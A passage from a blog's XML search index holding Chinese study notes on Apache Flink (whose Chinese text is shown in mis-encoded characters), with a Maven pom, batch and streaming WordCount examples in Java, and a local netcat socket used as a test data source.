class="title">FieldXy</span>&#123;</span></span><br><span class="line"><span class="class">    <span class="title">String</span> <span class="title">columnName</span>();</span></span><br><span class="line"><span class="class">    <span class="title">String</span> <span class="title">type</span>();</span></span><br><span class="line"><span class="class">    <span class="title">int</span> <span class="title">length</span>();</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">è¾“å‡ºç»“æœ</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">@<span class="title">cn</span>.<span class="title">bloghut</span>.<span class="title">annotation</span>.<span class="title">TableXy</span>(<span class="params">value=db_student</span>)</span></span><br><span class="line"><span class="class"><span class="title">db_student</span></span></span><br><span class="line"><span class="class"><span class="title">columnName</span>ï¼š<span class="title">db_name</span>   <span class="title">type</span>ï¼š<span class="title">varchar</span>   <span class="title">length</span>ï¼š3</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> JAVA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> åå°„ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Flinkå­¦ä¹ ç¬”è®°</title>
      <link href="/2021/09/06/Flink%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2021/09/06/Flink%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="https://www.bilibili.com/video/BV1qy4y1q728">å°šç¡…è°·2021æœ€æ–°Javaç‰ˆFlink</a></p><p>ä¸‹é¢ç¬”è®°æ¥æºï¼ˆå°šç¡…è°·å…¬å¼€èµ„æ–™ã€ç½‘ç»œåšå®¢ã€ä¸ªäººå°ç»“ï¼‰</p><p>ä¸­é—´ä¼šæŠŠè‡ªå·±è®¤ä¸ºè¾ƒé‡è¦çš„ç‚¹åšåšæ ‡è®°ï¼ˆä¸‹åˆ’çº¿ã€åŠ ç²—ç­‰ï¼‰</p></blockquote><h3 id="Flinkçš„ç‰¹ç‚¹"><a href="#Flinkçš„ç‰¹ç‚¹" class="headerlink" title="Flinkçš„ç‰¹ç‚¹"></a>Flinkçš„ç‰¹ç‚¹</h3><ul><li> äº‹ä»¶é©±åŠ¨ï¼ˆEvent-drivenï¼‰ </li><li> åŸºäºæµå¤„ç†<br>ä¸€åˆ‡çš†ç”±æµç»„æˆï¼Œç¦»çº¿æ•°æ®æ˜¯æœ‰ç•Œçš„æµï¼›å®æ—¶æ•°æ®æ˜¯ä¸€ä¸ªæ²¡æœ‰ç•Œé™çš„æµã€‚ï¼ˆæœ‰ç•Œæµã€æ— ç•Œæµï¼‰ </li><li>åˆ†å±‚API <ul><li>è¶Šé¡¶å±‚è¶ŠæŠ½è±¡ï¼Œè¡¨è¾¾å«ä¹‰è¶Šç®€æ˜ï¼Œä½¿ç”¨è¶Šæ–¹ä¾¿</li><li>è¶Šåº•å±‚è¶Šå…·ä½“ï¼Œè¡¨è¾¾èƒ½åŠ›è¶Šä¸°å¯Œï¼Œä½¿ç”¨è¶Šçµæ´»</li></ul></li></ul><h4 id="Flink-vs-Spark-Streaming"><a href="#Flink-vs-Spark-Streaming" class="headerlink" title="Flink vs Spark Streaming"></a>Flink vs Spark Streaming</h4><ul><li>æ•°æ®æ¨¡å‹ <ul><li>Sparké‡‡ç”¨RDDæ¨¡å‹ï¼Œspark streamingçš„DStreamå®é™…ä¸Šä¹Ÿå°±æ˜¯ä¸€ç»„ç»„å°æ‰¹æ•°æ®RDDçš„é›†åˆ</li><li>flinkåŸºæœ¬æ•°æ®æ¨¡å‹æ˜¯æ•°æ®æµï¼Œä»¥åŠäº‹ä»¶ï¼ˆEventï¼‰åºåˆ—</li></ul></li><li>è¿è¡Œæ—¶æ¶æ„ <ul><li>sparkæ˜¯æ‰¹è®¡ç®—ï¼Œå°†DAGåˆ’åˆ†ä¸ºä¸åŒçš„stageï¼Œä¸€ä¸ªå®Œæˆåæ‰å¯ä»¥è®¡ç®—ä¸‹ä¸€ä¸ª</li><li>flinkæ˜¯æ ‡å‡†çš„æµæ‰§è¡Œæ¨¡å¼ï¼Œä¸€ä¸ªäº‹ä»¶åœ¨ä¸€ä¸ªèŠ‚ç‚¹å¤„ç†å®Œåå¯ä»¥ç›´æ¥å‘å¾€ä¸‹ä¸€ä¸ªèŠ‚ç‚¹å¤„ç†</li></ul></li></ul><h3 id="å¿«é€Ÿä¸Šæ‰‹"><a href="#å¿«é€Ÿä¸Šæ‰‹" class="headerlink" title="å¿«é€Ÿä¸Šæ‰‹"></a>å¿«é€Ÿä¸Šæ‰‹</h3><h4 id="æ‰¹å¤„ç†å®ç°WordCount"><a href="#æ‰¹å¤„ç†å®ç°WordCount" class="headerlink" title="æ‰¹å¤„ç†å®ç°WordCount"></a>æ‰¹å¤„ç†å®ç°WordCount</h4><blockquote><p><em>flink-streaming-scala_2.12 =&gt; org.apache.flink:flink-runtime_2.12:1.12.1 =&gt; com.typesafe.akka:akka-actor_2.12:2.5.21ï¼Œakkaå°±æ˜¯ç”¨scalaå®ç°çš„ã€‚å³ä½¿è¿™é‡Œæˆ‘ä»¬ç”¨javaè¯­è¨€ï¼Œè¿˜æ˜¯ç”¨åˆ°äº†scalaå®ç°çš„åŒ…</em></p></blockquote><p>pomä¾èµ–</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>Flink_Tutorial<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">flink.version</span>&gt;</span>1.12.1<span class="tag">&lt;/<span class="name">flink.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scala.binary.version</span>&gt;</span>2.12<span class="tag">&lt;/<span class="name">scala.binary.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;flink.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-streaming-scala_$&#123;scala.binary.version&#125;<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;flink.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-clients_$&#123;scala.binary.version&#125;<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;flink.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ä»£ç å®ç°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.functions.FlatMapFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.java.DataSet;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.java.ExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.java.tuple.Tuple2;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.Collector;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/1/29 10:46 PM</span></span><br><span class="line"><span class="comment"> * æ‰¹å¤„ç† wordcount</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WordCount</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// åˆ›å»ºæ‰§è¡Œç¯å¢ƒ</span></span><br><span class="line">    ExecutionEnvironment env = ExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä»æ–‡ä»¶ä¸­è¯»å–æ•°æ®</span></span><br><span class="line">    String inputPath = <span class="string">&quot;/tmp/Flink_Tutorial/src/main/resources/hello.txt&quot;</span>;</span><br><span class="line">    DataSet&lt;String&gt; inputDataSet = env.readTextFile(inputPath);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¯¹æ•°æ®é›†è¿›è¡Œå¤„ç†ï¼ŒæŒ‰ç©ºæ ¼åˆ†è¯å±•å¼€ï¼Œè½¬æ¢æˆ(word, 1)äºŒå…ƒç»„è¿›è¡Œç»Ÿè®¡</span></span><br><span class="line">    <span class="comment">// æŒ‰ç…§ç¬¬ä¸€ä¸ªä½ç½®çš„wordåˆ†ç»„</span></span><br><span class="line">    <span class="comment">// æŒ‰ç…§ç¬¬äºŒä¸ªä½ç½®ä¸Šçš„æ•°æ®æ±‚å’Œ</span></span><br><span class="line">    DataSet&lt;Tuple2&lt;String, Integer&gt;&gt; resultSet = inputDataSet.flatMap(<span class="keyword">new</span> MyFlatMapper())</span><br><span class="line">      .groupBy(<span class="number">0</span>)</span><br><span class="line">      .sum(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    resultSet.print();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// è‡ªå®šä¹‰ç±»ï¼Œå®ç°FlatMapFunctionæ¥å£</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MyFlatMapper</span> <span class="keyword">implements</span> <span class="title">FlatMapFunction</span>&lt;<span class="title">String</span>, <span class="title">Tuple2</span>&lt;<span class="title">String</span>, <span class="title">Integer</span>&gt;&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">flatMap</span><span class="params">(String s, Collector&lt;Tuple2&lt;String, Integer&gt;&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="comment">// æŒ‰ç©ºæ ¼åˆ†è¯</span></span><br><span class="line">      String[] words = s.split(<span class="string">&quot; &quot;</span>);</span><br><span class="line">      <span class="comment">// éå†æ‰€æœ‰wordï¼ŒåŒ…æˆäºŒå…ƒç»„è¾“å‡º</span></span><br><span class="line">      <span class="keyword">for</span> (String str : words) &#123;</span><br><span class="line">        out.collect(<span class="keyword">new</span> Tuple2&lt;&gt;(str, <span class="number">1</span>));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(scala,1)</span><br><span class="line">(flink,1)</span><br><span class="line">(world,1)</span><br><span class="line">(hello,4)</span><br><span class="line">(and,1)</span><br><span class="line">(fine,1)</span><br><span class="line">(how,1)</span><br><span class="line">(spark,1)</span><br><span class="line">(you,3)</span><br><span class="line">(are,1)</span><br><span class="line">(thank,1)</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://blog.csdn.net/qq_41398614/article/details/107553604">è§£å†³ Flink å‡çº§1.11 æŠ¥é”™ No ExecutorFactory found to execute the application</a></p></blockquote><h4 id="æµå¤„ç†å®ç°WordCount"><a href="#æµå¤„ç†å®ç°WordCount" class="headerlink" title="æµå¤„ç†å®ç°WordCount"></a>æµå¤„ç†å®ç°WordCount</h4><p>åœ¨2.1æ‰¹å¤„ç†çš„åŸºç¡€ä¸Šï¼Œæ–°å»ºä¸€ä¸ªç±»è¿›è¡Œæ”¹åŠ¨ã€‚</p><ul><li> æ‰¹å¤„ç†=&gt;å‡ ç»„æˆ–æ‰€æœ‰æ•°æ®åˆ°è¾¾åæ‰å¤„ç†ï¼›æµå¤„ç†=&gt;æœ‰æ•°æ®æ¥å°±ç›´æ¥å¤„ç†ï¼Œä¸ç­‰æ•°æ®å †å åˆ°ä¸€å®šæ•°é‡çº§ </li><li> <strong>è¿™é‡Œä¸åƒæ‰¹å¤„ç†æœ‰groupBy =&gt; æ‰€æœ‰æ•°æ®ç»Ÿä¸€å¤„ç†ï¼Œè€Œæ˜¯ç”¨æµå¤„ç†çš„keyBy =&gt; æ¯ä¸€ä¸ªæ•°æ®éƒ½å¯¹keyè¿›è¡Œhashè®¡ç®—ï¼Œè¿›è¡Œç±»ä¼¼åˆ†åŒºçš„æ“ä½œï¼Œæ¥ä¸€ä¸ªæ•°æ®å°±å¤„ç†ä¸€æ¬¡ï¼Œæ‰€æœ‰ä¸­é—´è¿‡ç¨‹éƒ½æœ‰è¾“å‡ºï¼</strong> </li><li> <strong>å¹¶è¡Œåº¦ï¼šå¼€å‘ç¯å¢ƒçš„å¹¶è¡Œåº¦é»˜è®¤å°±æ˜¯è®¡ç®—æœºçš„CPUé€»è¾‘æ ¸æ•°</strong> </li></ul><p>ä»£ç å®ç°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> wc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.java.tuple.Tuple2;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.client.program.StreamContextEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/1/29 11:13 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StreamWordCount</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åˆ›å»ºæµå¤„ç†æ‰§è¡Œç¯å¢ƒ</span></span><br><span class="line">        StreamExecutionEnvironment env = StreamContextEnvironment.getExecutionEnvironment();</span><br><span class="line"></span><br><span class="line">      <span class="comment">// è®¾ç½®å¹¶è¡Œåº¦ï¼Œé»˜è®¤å€¼ = å½“å‰è®¡ç®—æœºçš„CPUé€»è¾‘æ ¸æ•°ï¼ˆè®¾ç½®æˆ1å³å•çº¿ç¨‹å¤„ç†ï¼‰</span></span><br><span class="line">        <span class="comment">// env.setMaxParallelism(32);</span></span><br><span class="line">      </span><br><span class="line">        <span class="comment">// ä»æ–‡ä»¶ä¸­è¯»å–æ•°æ®</span></span><br><span class="line">        String inputPath = <span class="string">&quot;/tmp/Flink_Tutorial/src/main/resources/hello.txt&quot;</span>;</span><br><span class="line">        DataStream&lt;String&gt; inputDataStream = env.readTextFile(inputPath);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åŸºäºæ•°æ®æµè¿›è¡Œè½¬æ¢è®¡ç®—</span></span><br><span class="line">        DataStream&lt;Tuple2&lt;String,Integer&gt;&gt; resultStream = inputDataStream.flatMap(<span class="keyword">new</span> WordCount.MyFlatMapper())</span><br><span class="line">                .keyBy(item-&gt;item.f0)</span><br><span class="line">                .sum(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        resultStream.print();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ‰§è¡Œä»»åŠ¡</span></span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><p><em>è¿™é‡Œå› ä¸ºæ˜¯æµå¤„ç†ï¼Œæ‰€ä»¥æ‰€æœ‰ä¸­é—´è¿‡ç¨‹éƒ½ä¼šè¢«è¾“å‡ºï¼Œå‰é¢çš„åºå·å°±æ˜¯å¹¶è¡Œæ‰§è¡Œä»»åŠ¡çš„çº¿ç¨‹ç¼–å·ã€‚</em></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">9&gt;</span><span class="bash"> (world,1)</span></span><br><span class="line"><span class="meta">5&gt;</span><span class="bash"> (hello,1)</span></span><br><span class="line"><span class="meta">8&gt;</span><span class="bash"> (are,1)</span></span><br><span class="line"><span class="meta">10&gt;</span><span class="bash"> (you,1)</span></span><br><span class="line"><span class="meta">11&gt;</span><span class="bash"> (how,1)</span></span><br><span class="line"><span class="meta">6&gt;</span><span class="bash"> (thank,1)</span></span><br><span class="line"><span class="meta">9&gt;</span><span class="bash"> (fine,1)</span></span><br><span class="line"><span class="meta">10&gt;</span><span class="bash"> (you,2)</span></span><br><span class="line"><span class="meta">10&gt;</span><span class="bash"> (you,3)</span></span><br><span class="line"><span class="meta">15&gt;</span><span class="bash"> (and,1)</span></span><br><span class="line"><span class="meta">5&gt;</span><span class="bash"> (hello,2)</span></span><br><span class="line"><span class="meta">13&gt;</span><span class="bash"> (flink,1)</span></span><br><span class="line"><span class="meta">1&gt;</span><span class="bash"> (spark,1)</span></span><br><span class="line"><span class="meta">5&gt;</span><span class="bash"> (hello,3)</span></span><br><span class="line"><span class="meta">1&gt;</span><span class="bash"> (scala,1)</span></span><br><span class="line"><span class="meta">5&gt;</span><span class="bash"> (hello,4)</span></span><br></pre></td></tr></table></figure><pre><code>è¿™é‡Œ`env.execute();`ä¹‹å‰çš„ä»£ç ï¼Œå¯ä»¥ç†è§£ä¸ºæ˜¯åœ¨å®šä¹‰ä»»åŠ¡ï¼Œåªæœ‰æ‰§è¡Œ`env.execute()`åï¼ŒFlinkæ‰æŠŠå‰é¢çš„ä»£ç ç‰‡æ®µå½“ä½œä¸€ä¸ªä»»åŠ¡æ•´ä½“ï¼ˆæ¯ä¸ªçº¿ç¨‹æ ¹æ®è¿™ä¸ªä»»åŠ¡æ“ä½œï¼Œå¹¶è¡Œå¤„ç†æµæ•°æ®ï¼‰ã€‚</code></pre><h4 id="æµå¼æ•°æ®æºæµ‹è¯•"><a href="#æµå¼æ•°æ®æºæµ‹è¯•" class="headerlink" title="æµå¼æ•°æ®æºæµ‹è¯•"></a>æµå¼æ•°æ®æºæµ‹è¯•</h4><ol><li><p> é€šè¿‡<code>nc -lk &lt;port&gt;</code>æ‰“å¼€ä¸€ä¸ªsocketæœåŠ¡ï¼Œç”¨äºæ¨¡æ‹Ÿå®æ—¶çš„æµæ•°æ®  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lk 7777</span><br></pre></td></tr></table></figure></li><li><p> ä»£ç ä¿®æ”¹inputStreamçš„éƒ¨åˆ†  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> wc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.java.tuple.Tuple2;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.client.program.StreamContextEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/1/29 11:13 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StreamWordCount</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åˆ›å»ºæµå¤„ç†æ‰§è¡Œç¯å¢ƒ</span></span><br><span class="line">        StreamExecutionEnvironment env = StreamContextEnvironment.getExecutionEnvironment();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è®¾ç½®å¹¶è¡Œåº¦ï¼Œé»˜è®¤å€¼ = å½“å‰è®¡ç®—æœºçš„CPUé€»è¾‘æ ¸æ•°ï¼ˆè®¾ç½®æˆ1å³å•çº¿ç¨‹å¤„ç†ï¼‰</span></span><br><span class="line">        <span class="comment">// env.setMaxParallelism(32);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä»æ–‡ä»¶ä¸­è¯»å–æ•°æ®</span></span><br><span class="line"><span class="comment">//        String inputPath = &quot;/tmp/Flink_Tutorial/src/main/resources/hello.txt&quot;;</span></span><br><span class="line"><span class="comment">//        DataStream&lt;String&gt; inputDataStream = env.readTextFile(inputPath);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä»socketæ–‡æœ¬æµè¯»å–æ•°æ®</span></span><br><span class="line">        DataStream&lt;String&gt; inputDataStream = env.socketTextStream(<span class="string">&quot;localhost&quot;</span>, <span class="number">7777</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åŸºäºæ•°æ®æµè¿›è¡Œè½¬æ¢è®¡ç®—</span></span><br><span class="line">        DataStream&lt;Tuple2&lt;String,Integer&gt;&gt; resultStream = inputDataStream.flatMap(<span class="keyword">new</span> WordCount.MyFlatMapper())</span><br><span class="line">                .keyBy(item-&gt;item.f0)</span><br><span class="line">                .sum(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        resultStream.print();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ‰§è¡Œä»»åŠ¡</span></span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>åœ¨æœ¬åœ°å¼€å¯çš„socketä¸­è¾“å…¥æ•°æ®ï¼Œè§‚å¯ŸIDEAçš„consoleè¾“å‡ºã€‚<br> æœ¬äººæµ‹è¯•åå‘ç°ï¼ŒåŒä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå‰é¢è¾“å‡ºçš„ç¼–å·æ˜¯ä¸€æ ·çš„ï¼Œå› ä¸ºkey =&gt; 